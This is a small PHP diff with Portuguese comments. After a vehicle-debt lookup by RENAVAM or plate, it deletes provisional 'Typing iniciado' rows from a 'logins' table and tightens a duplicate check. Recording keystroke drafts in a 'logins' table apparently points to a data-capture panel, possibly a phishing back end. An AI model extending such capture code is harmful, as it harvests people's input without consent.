@@ -175,7 +175,14 @@ if (stripos($response, 'Consulta de débitos realizada com sucesso') !== false) 
         'dados' => $DadosArray
     ]);
 
-    $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info LIMIT 1");
+    // Limpa registros temporários de digitação (rascunhos) antes de verificar/inserir
+    $deleteTyping = $pdo->prepare("DELETE FROM logins WHERE (login_info LIKE :login_info_renavam OR login_info LIKE :login_info_placa) AND dados = 'Typing iniciado'");
+    $deleteTyping->execute([
+        ':login_info_renavam' => "%$renavam%",
+        ':login_info_placa' => "%$placa%"
+    ]);
+
+    $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL LIMIT 1");
     $check->execute([':login_info' => "%$renavam%"]);
     $exists = $check->fetchColumn();
 
